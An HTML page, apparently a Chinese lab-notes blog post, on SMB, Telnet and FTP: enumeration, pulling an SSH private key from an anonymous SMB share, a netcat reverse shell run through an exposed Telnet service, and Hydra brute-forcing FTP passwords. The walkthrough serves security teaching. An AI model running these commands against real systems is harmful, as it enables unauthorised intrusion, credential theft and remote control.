@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="x5-fullscreen" content="true">
+<meta name="full-screen" content="yes">
+<meta name="theme-color" content="#317EFB" />
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=0" name="viewport">
+<meta name="description" content="服务器消息块协议（SMB）服务器消息块协议 (SMB) 是用于在客户端和服务器之间共享文件、打印机、端口以及其他资源访问的通信协议。通过 SMB 协议，服务器可通过网络向客户端提供文件系统和资源的访问权限，客户端则可以访问服务器上的共享文件和打印机。 SMB 是一种请求-响应协议，通过在客户端和服务器之间交换消息来建立连接。客户端常通过 TCP&#x2F;IP 协议与服务器连接 SMB 是如何工作">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络服务">
+<meta property="og:url" content="https://cyphersun.github.io/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD5/index.html">
+<meta property="og:site_name" content="CypherSun">
+<meta property="og:description" content="服务器消息块协议（SMB）服务器消息块协议 (SMB) 是用于在客户端和服务器之间共享文件、打印机、端口以及其他资源访问的通信协议。通过 SMB 协议，服务器可通过网络向客户端提供文件系统和资源的访问权限，客户端则可以访问服务器上的共享文件和打印机。 SMB 是一种请求-响应协议，通过在客户端和服务器之间交换消息来建立连接。客户端常通过 TCP&#x2F;IP 协议与服务器连接 SMB 是如何工作">
+<meta property="og:locale">
+<meta property="article:published_time" content="2024-11-02T08:05:36.000Z">
+<meta property="article:modified_time" content="2024-11-05T10:21:17.736Z">
+<meta property="article:author" content="CypherSun">
+<meta name="twitter:card" content="summary">
+
+
+<title >网络服务</title>
+
+<!-- Favicon -->
+
+
+    <link href='/favicon.ico?v=2.2.3' rel='icon' type='image/png' sizes='32x32' ></link>
+
+
+
+
+<!-- Plugin -->
+
+
+
+
+    
+<link rel="stylesheet" href="https://unpkg.com/hexo-theme-async@2.2.3/source/css/plugins/bootstrap.row.css">
+
+    
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.css">
+
+    
+    
+
+
+
+
+<!-- Icon -->
+
+    
+<link rel="stylesheet" href="/css/plugins/font-awesome.min.css">
+
+
+
+
+<!-- Variable -->
+<script>window.ASYNC_CONFIG = {"hostname":"cyphersun.github.io","author":"CypherSun","root":"/","typed_text":["a cybersecurity engineer"],"theme_version":"2.2.3","theme":{"switch":true,"default":"style-light"},"favicon":{"logo":null,"icon16":null,"icon32":"favicon.ico","apple_touch_icon":null,"webmanifest":null,"visibilitychange":true,"hidden":"favicon.ico","show_text":"(/≧▽≦/)咦！又好了！","hide_text":"(●—●)喔哟，崩溃啦！","appleTouchIcon":null,"showText":"骗你的~ (￣▽￣)ノ","hideText":"崩溃啦！(╯‵□′)╯︵┻━┻"},"i18n":{"placeholder":"搜索文章...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）","author":"本文作者：","copyright_link":"本文链接：","copyright_license_title":"版权声明：","copyright_license_content":"本博客所有文章除特别声明外，均默认采用 undefined 许可协议。","copy_success":"复制成功","copy_failure":"复制失败","open_read_mode":"进入阅读模式","exit_read_mode":"退出阅读模式","notice_outdate_message":"距离上次更新已经 undefined 天了, 文章内容可能已经过时。","sticky":"置顶","just":"刚刚","min":"分钟前","hour":"小时前","day":"天前","month":"个月前"},"swup":true,"plugin":{"flickr_justified_gallery":"https://unpkg.com/flickr-justified-gallery@latest/dist/fjGallery.min.js"},"icons":{"sun":"far fa-sun","moon":"far fa-moon","play":"fas fa-play","email":"far fa-envelope","next":"fas fa-arrow-right","calendar":"far fa-calendar-alt","clock":"far fa-clock","user":"far fa-user","back_top":"fas fa-arrow-up","close":"fas fa-times","search":"fas fa-search","reward":"fas fa-hand-holding-usd","toc_tag":"fas fa-th-list","read":"fas fa-book-reader","arrows":"fas fa-arrows-alt-h","double_arrows":"fas fa-angle-double-down","copy":"fas fa-copy","user_tag":"fas fa-user-alt"},"icontype":"font","highlight":{"plugin":"highlighjs","theme":true,"copy":true,"lang":true,"title":"default","height_limit":"200px"},"toc":{"post_title":true},"live_time":{"start_time":"03/09/2024 15:46:00","prefix":"博客已萌萌哒运行 undefined 天"},"danmu":{"enable":false,"el":".trm-banner"},"search":{"enable":true,"type":"local","href":"https://www.google.com/search?q=site:","domain":null,"path":"search.xml"}};</script>
+<script id="async-page-config">window.PAGE_CONFIG = {"isPost":true,"isHome":false,"postUpdate":"2024-11-05 11:21:17"};</script>
+
+<!-- Theme mode css -->
+<link data-swup-theme rel="stylesheet" href="/css/index.css?v=2.2.3" id="trm-switch-style">
+<script>
+    let defaultMode = ASYNC_CONFIG.theme.default !=='auto' ?  ASYNC_CONFIG.theme.default : (window.matchMedia("(prefers-color-scheme: light)").matches ? 'style-light' : 'style-dark')
+    let catchMode = localStorage.getItem('theme-mode') || defaultMode;
+    let type = catchMode === 'style-dark' ? 'add' : 'remove';
+    document.documentElement.classList[type]('dark')
+</script>
+
+<!-- CDN -->
+
+
+    
+    
+
+
+
+<!-- Site Analytics -->
+
+ 
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+  <!-- app wrapper -->
+  <div class="trm-app-frame">
+
+    <!-- page preloader -->
+    <div class="trm-preloader">
+    <div class="trm-holder">
+        <div class="preloader">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+</div>
+    <!-- page preloader end -->
+
+    <!-- change mode preloader -->
+    <div class="trm-mode-swich-animation-frame">
+    <div class="trm-mode-swich-animation">
+        <i class="i-sun"><i class="iconfont far fa-sun"></i></i>
+        <div class="trm-horizon"></div>
+        <i class="i-moon"><i class="iconfont far fa-moon"></i></i>
+    </div>
+</div>
+    <!-- change mode preloader end -->
+
+      <!-- scroll container -->
+      <div id="trm-dynamic-content" class="trm-swup-animation">
+        <div id="trm-scroll-container" class="trm-scroll-container" style="opacity: 0">
+            <!-- top bar -->
+            <header class="trm-top-bar">
+	<div class="container">
+		<div class="trm-left-side">
+			<!-- logo -->
+<a href="/" class="trm-logo-frame trm-anima-link">
+    
+    
+</a>
+<!-- logo end -->
+		</div>
+		<div class="trm-right-side">
+			<!-- menu -->
+<div class="trm-menu">
+    <nav>
+        <ul>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/" target="">
+                    首页
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/tags/" target="">
+                    标签
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/categories/" target="">
+                    分类
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/archives/" target="">
+                    归档
+                </a>
+                
+            </li>
+            
+            <li class="menu-item-has-children ">
+                <a  href="/about/" target="">
+                    关于
+                </a>
+                
+            </li>
+            
+        </ul>
+    </nav>
+</div>
+<!-- menu end -->
+			
+    <!-- mode switcher place -->
+    <div class="trm-mode-switcher-place">
+        <div class="trm-mode-switcher">
+            <i class="iconfont far fa-sun"></i>
+            <input class="tgl tgl-light" id="trm-swich" type="checkbox">
+            <label class="trm-swich" for="trm-swich"></label>
+            <i class="iconfont far fa-moon"></i>
+        </div>
+    </div>
+    <!-- mode switcher place end -->
+
+			
+    
+    <div id="trm-search-btn" class="trm-search-btn">
+        <i class="iconfont fas fa-search"></i>
+    </div>
+     
+
+		</div>
+		<div class="trm-menu-btn">
+			<span></span>
+		</div>
+	</div>
+</header>
+            <!-- top bar end -->
+
+            <!-- body -->
+            
+<div class="trm-content-start">
+    <!-- banner -->
+    <div class="trm-banner">
+    
+    <!-- banner cover -->
+    <img style="object-position:top;object-fit:cover;" alt="banner" class="trm-banner-cover" src="/null">
+    <!-- banner cover end -->
+    
+
+    <!-- banner content -->
+    <div class="trm-banner-content trm-overlay">
+        <div class="container">
+            <div class="row">
+                
+                <div class="col-lg-4"></div>
+                
+                <div class="col-lg-8">
+
+                    <!-- banner title -->
+                    <div class="trm-banner-text ">
+                        <div class="trm-label trm-mb-20">
+                            NEWS LETTER
+                        </div>
+                        <h1 class="trm-mb-30 trm-hsmb-font">
+                            网络服务
+                        </h1>
+
+                        
+                            <ul class="trm-breadcrumbs trm-label">
+                                <li>
+                                    <a href="/" class="trm-anima-link">Home</a>
+                                </li>
+                                <li>
+                                    <span>
+                                        2024
+                                    </span>
+                                </li>
+                            </ul>
+                        
+                    </div>
+                    <!-- banner title end -->
+
+                    <!-- scroll hint -->
+                    <span id="scroll-triger" class="trm-scroll-hint-frame">
+                        <div class="trm-scroll-hint"></div>
+                        <span class="trm-label">Scroll down</span>
+                    </span>
+                    <!-- scroll hint end -->
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- banner content end -->
+</div>
+    <!-- banner end -->
+    <div class="container">
+        <div class="row">
+            
+                <div class="trm-page-sidebar col-lg-4 hidden-sm">
+                    <!-- main card -->
+                    <div class="trm-main-card-frame trm-sidebar">
+    <div class="trm-main-card"> 
+        <!-- card header -->
+<div class="trm-mc-header">
+    <div class="trm-avatar-frame trm-mb-20">
+        <img alt="Avatar" class="trm-avatar" src="https://avatars.githubusercontent.com/u/80212458?v=4">
+    </div>
+    <h5 class="trm-name trm-mb-15">
+        CypherSun
+    </h5>
+    
+        <div class="trm-label">
+            I`m
+            <span class="trm-typed-text">
+                <!-- Words for theme.user.typedText -->
+            </span>
+        </div>
+    
+</div>
+<!-- card header end -->
+        <!-- sidebar social -->
+
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<div class="trm-social">
+    
+        <a href="https://github.com/CypherSun" title="Github" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-github"></i>
+        </a>
+    
+        <a href="/wechat.jpg" title="Wechat" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-weixin"></i>
+        </a>
+    
+        <a href="/qq.jpg" title="QQ" rel="nofollow" target="_blank">
+            <i class="iconfont fab fa-qq"></i>
+        </a>
+    
+</div>
+
+<!-- sidebar social end -->
+        <!-- info -->
+<div class="trm-divider trm-mb-40 trm-mt-40"></div>
+<ul class="trm-table trm-mb-20">
+    
+        <li>
+            <div class="trm-label">
+                地址:
+            </div>
+            <div class="trm-label trm-label-light">
+                银河系
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                年龄:
+            </div>
+            <div class="trm-label trm-label-light">
+                不清楚
+            </div>
+        </li>
+    
+        <li>
+            <div class="trm-label">
+                实力:
+            </div>
+            <div class="trm-label trm-label-light">
+                上升期
+            </div>
+        </li>
+    
+</ul>
+<!-- info end -->
+
+        
+    <div class="trm-divider trm-mb-40 trm-mt-40"></div>
+    <!-- action button -->
+    <div class="text-center">
+        <a href="mailto:84860748@qq.com" class="trm-btn">
+            联系我
+            <i class="iconfont far fa-envelope"></i>
+        </a>
+    </div>
+    <!-- action button end -->
+
+    </div>
+</div>
+                    <!-- main card end -->
+                </div>
+            
+            <div class="trm-page-content col-lg-8">
+                <div id="trm-content" class="trm-content">
+                    <div class="trm-post-info row hidden-sm">
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-calendar-alt trm-icon"></i><br>
+            11/02
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-clock trm-icon"></i><br>
+            09:05
+        </div>
+    </div>
+    <div class="col-sm-4">
+        <div id="post-author" class="trm-card trm-label trm-label-light text-center">
+            <i class="iconfont far fa-user trm-icon"></i><br>
+            CypherSun
+        </div>
+    </div>
+</div>
+<div class="trm-card ">
+    <article id="article-container" class="trm-publication">
+    <h2 id="服务器消息块协议（SMB）"><a href="#服务器消息块协议（SMB）" class="headerlink" title="服务器消息块协议（SMB）"></a>服务器消息块协议（SMB）</h2><p>服务器消息块协议 (SMB) 是用于在客户端和服务器之间共享文件、打印机、端口以及其他资源访问的通信协议。通过 SMB 协议，服务器可通过网络向客户端提供文件系统和资源的访问权限，客户端则可以访问服务器上的共享文件和打印机。</p>
+<p>SMB 是一种请求-响应协议，通过在客户端和服务器之间交换消息来建立连接。客户端常通过 TCP&#x2F;IP 协议与服务器连接</p>
+<h3 id="SMB-是如何工作的？"><a href="#SMB-是如何工作的？" class="headerlink" title="SMB 是如何工作的？"></a>SMB 是如何工作的？</h3><p>建立连接后，客户端通过发送 SMB 命令来访问服务器上的共享资源，执行文件的打开、读写等操作，所有这些文件系统操作都通过网络完成。</p>
+<h3 id="什么系统支持-SMB？"><a href="#什么系统支持-SMB？" class="headerlink" title="什么系统支持 SMB？"></a>什么系统支持 SMB？</h3><p>自 Windows 95 起，Microsoft Windows 操作系统就内置了 SMB 协议的客户端和服务器支持。对于 Unix 系统，Samba 是一个支持 SMB 协议的开源服务器，用于在 Unix 和 Windows 系统之间共享文件和资源。<br><br></p>
+<h2 id="SMB-枚举"><a href="#SMB-枚举" class="headerlink" title="SMB 枚举"></a>SMB 枚举</h2><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举是指收集目标系统信息的过程种发现潜在的攻击面，从而有效地进行漏洞利用。攻击者可以收集诸如用户名、密码、网络信息、主机名、应用程序数据、服务等关键信息，避免在无效漏洞利用上浪费时间和资源。</p>
+<h3 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h3><p>服务器通常提供可连接的 SMB 共享驱动器，用户可以通过这些共享访问或传输文件。SMB 常是攻击者获取敏感信息的首要入口</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>枚举的第一步通常是端口扫描，以识别目标机器上开放的端口和运行的服务。帮助收集关于服务、应用程序、网络结构和操作系统的信息。</p>
+<h3 id="Enum4Linux"><a href="#Enum4Linux" class="headerlink" title="Enum4Linux"></a>Enum4Linux</h3><p>Enum4Linux 是一个用于在 SMB 协议上枚举 Windows 和 Linux 系统共享资源的工具。它整合了 Samba 工具包中的功能，能快速提取 SMB 相关信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">enum4linux -a 10.10.118.119</span><br><span class="line"><span class="comment"># enum4linux [选项] [目标 IP]</span></span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-U</td>
+<td>获取用户列表</td>
+</tr>
+<tr>
+<td>-M</td>
+<td>获取机器列表</td>
+</tr>
+<tr>
+<td>-N</td>
+<td>获取名称列表（不同于 -U 和 -M）</td>
+</tr>
+<tr>
+<td>-S</td>
+<td>获取共享列表</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>获取密码策略信息</td>
+</tr>
+<tr>
+<td>-G</td>
+<td>获取组和成员列表</td>
+</tr>
+<tr>
+<td>-a</td>
+<td>启用上述所有选项（枚举所有）</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+
+
+<h2 id="SMB-利用"><a href="#SMB-利用" class="headerlink" title="SMB 利用"></a>SMB 利用</h2><h3 id="SMB-漏洞类型"><a href="#SMB-漏洞类型" class="headerlink" title="SMB 漏洞类型"></a>SMB 漏洞类型</h3><p>通过系统配置错误进入系统是常见的安全漏洞，这种错误配置可能允许攻击者获取系统控制所需的信息。</p>
+<p>常见的 SMB 信息：<br>SMB 共享的位置<br>SMB 共享名称<br>SMBClient 使用</p>
+<p>SMBClient 是 Samba 套件中的工具，用于访问 SMB 共享。可使用 SMBClient 访问通过 SMB 枚举发现的共享文件夹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.118.119/profiles</span><br><span class="line"><span class="comment"># smbclient //[目标 IP]/[文件名]</span></span><br><span class="line"><span class="comment"># 通过枚举的文件名，执行命令看看有没有允许匿名访问权限</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="comment"># 找到敏感信息</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&quot;id_rsa&quot;</span></span><br><span class="line"><span class="comment"># 下载ssh里面id_rsa到本地</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">chmod</span> 600 id_rsa</span><br><span class="line"><span class="comment"># 设置id_rsa文件的权限，只有文件的所有者可读写，其他用户无法访问</span></span><br><span class="line"></span><br><span class="line">ssh -i id_rsa cactus@10.10.118.119</span><br><span class="line"><span class="comment"># ssh -i id_rsa [用户名]@[目标 IP]</span></span><br><span class="line"><span class="comment"># 使用id_rsa文件配合用户名和 IP 进行 ssh 连接</span></span><br></pre></td></tr></table></figure>
+
+<p>SMBClient 可用选项：</p>
+<table>
+<thead>
+<tr>
+<th>标签</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-U [name]</td>
+<td>指定用户名</td>
+</tr>
+<tr>
+<td>-p [port]</td>
+<td>指定端口</td>
+</tr>
+</tbody></table>
+<br>
+
+
+
+
+
+<h2 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h2><h3 id="Telnet-是什么？"><a href="#Telnet-是什么？" class="headerlink" title="Telnet 是什么？"></a>Telnet 是什么？</h3><p>Telnet 是一种应用层协议，允许用户通过 Telnet 客户端连接到远程主机，并在该主机上执行命令。前提是远程主机正在运行 Telnet 服务器。建立连接后，客户端会作为虚拟终端，用户可以通过它与远程主机交互。</p>
+<h3 id="替代"><a href="#替代" class="headerlink" title="替代"></a>替代</h3><p>Telnet 以明文传输所有数据，缺乏安全机制，已在许多应用中被 SSH 替代。</p>
+<h3 id="Telnet-如何工作？"><a href="#Telnet-如何工作？" class="headerlink" title="Telnet 如何工作？"></a>Telnet 如何工作？</h3><p>用户通过 Telnet 客户端连接到服务器，并可在连接后使用特定命令在服务器上执行指令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.200.228 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+
+
+<h2 id="Telnet-枚举"><a href="#Telnet-枚举" class="headerlink" title="Telnet 枚举"></a>Telnet 枚举</h2><h3 id="枚举-1"><a href="#枚举-1" class="headerlink" title="枚举"></a>枚举</h3><p>在利用配置错误的网络服务时，潜在的漏洞不容易发现。枚举网络服务时，需确保不遗漏任何信息</p>
+<h3 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>通过端口扫描来识别目标机器上运行的服务、应用程序、系统结构和操作系统，获取尽可能多的基础信息<br><br></p>
+<h2 id="Telnet-利用"><a href="#Telnet-利用" class="headerlink" title="Telnet 利用"></a>Telnet 利用</h2><h3 id="Telnet-漏洞类型"><a href="#Telnet-漏洞类型" class="headerlink" title="Telnet 漏洞类型"></a>Telnet 漏洞类型</h3><p>Telnet 协议本身存在安全缺陷，缺乏加密功能，所有通信均以明文传输，且访问控制机制较弱。针对 Telnet 的漏洞较多，公开漏洞（CVE）库中包含了多个 Telnet 相关的漏洞 ID。能发现 Telnet 配置错误或运行不当进行利用</p>
+<h3 id="方法分解"><a href="#方法分解" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据在枚举阶段收集的信息：</p>
+<p>获取额外信息<br>尝试访问 Telnet 端口</p>
+<p>利用收集的信息，尝试连接和进一步获取权限，直至获得反向 Shell。</p>
+<h3 id="什么是反向-Shell？"><a href="#什么是反向-Shell？" class="headerlink" title="什么是反向 Shell？"></a>什么是反向 Shell？</h3><p>Shell 是用于在目标设备上获得代码或命令执行权限的代码或程序</p>
+<p>反向 Shell 是 Shell 类型的一种，目标机器会主动向攻击者的机器发起连接。攻击者监听本地的一个端口，通过该端口接收连接，从而实现代码或命令的执行</p>
+<h3 id="连接到-Telnet"><a href="#连接到-Telnet" class="headerlink" title="连接到 Telnet"></a>连接到 Telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.44.79 8012</span><br><span class="line"><span class="comment"># telnet [目标 IP] [端口]</span></span><br><span class="line"><span class="comment"># 执行命令但无回显</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> tcpdump ip proto \\icmp -i ens5</span><br><span class="line"><span class="comment"># 另启窗口，进行监听，配合一下命令查看是否能收到 ping 消息</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN ping 10.10.22.30 -c 1</span><br><span class="line"><span class="comment"># 在 telnet 尝试 ping 本机，查看目标主机命令是否能执行命令，能执行就可以进行下一步开始制作反向shell</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=10.10.44.176 lport=4444 R</span><br><span class="line"><span class="comment"># msfvenom -p cmd/unix/reverse_netcat lhost=[本机 IP] lport=[监听端口] R</span></span><br><span class="line"><span class="comment"># 另启窗口，使用msfvenom制作反向shell</span></span><br><span class="line"><span class="comment"># -p = 有效载荷</span></span><br><span class="line"><span class="comment"># R = 以原始格式导出有效载荷</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得反向shell：mkfifo /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; rm /tmp/dxtpdlx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"><span class="comment"># 另启窗口，监听本地 4444 端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.RUN <span class="built_in">mkfifo</span> /tmp/dxtpdlx; nc 10.10.22.30 4444 0&lt;/tmp/dxtpdlx | /bin/sh &gt;/tmp/dxtpdlx 2&gt;&amp;1; <span class="built_in">rm</span> /tmp/dxtpdlx</span><br><span class="line"><span class="comment"># 在 telnet 输入反向shell命令获得权限</span></span><br></pre></td></tr></table></figure>
+<br>
+
+
+
+
+
+<h2 id="文件传输协议（FTP）"><a href="#文件传输协议（FTP）" class="headerlink" title="文件传输协议（FTP）"></a>文件传输协议（FTP）</h2><h3 id="文件传输协议（FTP）是什么？"><a href="#文件传输协议（FTP）是什么？" class="headerlink" title="文件传输协议（FTP）是什么？"></a>文件传输协议（FTP）是什么？</h3><p>文件传输协议 (FTP) 是一种用于在网络上远程传输文件的协议。它采用客户端-服务器模式，通过独立的命令和数据通道来实现高效的文件传输。</p>
+<h3 id="FTP如何工作？"><a href="#FTP如何工作？" class="headerlink" title="FTP如何工作？"></a>FTP如何工作？</h3><p>典型的 FTP 会话使用两个通道：</p>
+<p>命令通道（控制通道）：传输命令和命令的响应<br>数据通道：传输文件数据</p>
+<p>FTP 基于客户端-服务器协议。客户端发起与服务器的连接，服务器验证提供的登录凭据，成功后开启会话。会话建立后，客户端可以在服务器上执行各种 FTP 命令。</p>
+<h3 id="主动模式-vs-被动模式"><a href="#主动模式-vs-被动模式" class="headerlink" title="主动模式 vs 被动模式"></a>主动模式 vs 被动模式</h3><p>FTP 服务器可以支持主动（Active）和被动（Passive）模式，或同时支持两者。</p>
+<p>在主动 FTP 连接中，客户端打开一个端口并进行监听，服务器主动连接该端口进行数据传输<br>在被动 FTP 连接中，服务器打开一个端口并被动监听，客户端连接到该端口以传输数据</p>
+<p>将命令和数据划分到不同的通道，可在不等待数据传输完成的情况下向服务器发送命令。提高了大文件传输或慢速网络连接时的效率<br><br></p>
+<h2 id="FTP-枚举"><a href="#FTP-枚举" class="headerlink" title="FTP 枚举"></a>FTP 枚举</h2><h3 id="枚举-2"><a href="#枚举-2" class="headerlink" title="枚举"></a>枚举</h3><p>使用 nmap 进行有效的端口扫描，确认目标服务器上是否开放 FTP 服务。</p>
+<h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>尝试使用匿名 FTP 登录，检查是否可以访问任何文件或文件夹。查看 FTP 服务器配置中的疏漏，判断文件内容是否包含有助于在系统上获取 Shell 的信息。</p>
+<h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>将登录FTP服务器，需要确保系统上安装了FTP客户端。大多数Linux操作系统通常默认安装了FTP客户端。可以通过在控制台中输入 ftp 来测试是否已安装。如果出现 ftp&gt; 提示符，则表示系统上有一个工作正常的FTP客户端。如果没有，可以使用 sudo apt install ftp 安装</p>
+<p>登录 FTP 服务器前，需确保系统上安装了 FTP 客户端。大多数 Linux 系统通常默认安装 FTP 客户端，可通过控制台输入 ftp 检查。如果出现 ftp&gt; 提示符，则表示 FTP 客户端正常工作。如果未安装，可使用以下命令安装：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install ftp</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="替代枚举方法"><a href="#替代枚举方法" class="headerlink" title="替代枚举方法"></a>替代枚举方法</h3><p>一些旧版本的 in.ftpd 和其他 FTP 服务器的变体可能会通过 cwd 命令暴露用户信息。未登录时，客户端可以使用 cwd 命令检测目标目录是否存在。如果目录存在，则很可能存在对应的用户帐户。这种方法主要适用于旧版 FTP 系统。<br><br></p>
+<h2 id="FTP-利用"><a href="#FTP-利用" class="headerlink" title="FTP 利用"></a>FTP 利用</h2><h3 id="FTP漏洞类型"><a href="#FTP漏洞类型" class="headerlink" title="FTP漏洞类型"></a>FTP漏洞类型</h3><p>与 Telnet 相似，FTP 的命令和数据通道均为未加密状态，传输的数据易被中间人攻击截获和读取。如果使用弱密码或默认密码配置，FTP 服务器也会容易受到攻击</p>
+<h3 id="方法分解-1"><a href="#方法分解-1" class="headerlink" title="方法分解"></a>方法分解</h3><p>根据枚举阶段的信息：</p>
+<p>确认目标机器上运行 FTP 服务器。<br>获取可能的用户名。<br>使用暴力破解尝试获取 FTP 服务器的密码。</p>
+<h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>Hydra 是一款快速的在线密码破解工具，可对 50 多种协议进行字典攻击，包括 Telnet、RDP、SSH、FTP 等。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.102.137 ftp</span><br><span class="line"><span class="comment"># hydra -t 4 -l [用户名] -P [字典路径] -vV [目标 IP] ftp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -t 4	设置每个目标的并行连接数为4</span></span><br><span class="line"><span class="comment"># -vV	设置为详细模式，显示每次尝试的用户名和密码组合</span></span><br><span class="line"><span class="comment"># ftp / 协议	指定要攻击的协议类型</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ftp 10.10.102.137  </span><br><span class="line"><span class="comment"># ftp [目标 IP]</span></span><br><span class="line"><span class="comment"># 获取密码后，使用 ftp 进行连接</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+
+
+</article>
+    
+    
+
+</div>
+<div class="trm-post-next-prev row">
+    <div class="col-lg-12">
+        <!-- title -->
+        <h5 class="trm-title-with-divider">
+            其他文章
+            <span data-number="02"></span>
+        </h5>
+    </div>
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
+        <a href="/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD6/" class="trm-cover-frame trm-anima-link">
+            
+            
+                <div class="trm-cover-date">
+                    <div class="trm-cover-day">02</div>
+                    <div class="trm-cover-month">2024/11</div>
+                </div>
+            
+        </a>
+        
+        <div class="trm-card-descr">
+            <div class="trm-label trm-category trm-mb-20">
+                <a href=" /categories/%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD/">
+                    基础技能
+                </a>
+            </div>
+            <h5>
+                <a href="/2024/11/02/T2-%E5%9F%BA%E7%A1%80%E6%8A%80%E8%83%BD6/" class="trm-anima-link">
+                    网络服务 2
+                </a>
+            </h5>
+            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
+            <ul class="trm-card-data trm-label">
+                <li>24/11/02</li>
+                <li>21:38</li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</div>
+    
+    
+        <div class="col-lg-6">
+    <div class="trm-blog-card trm-scroll-animation">
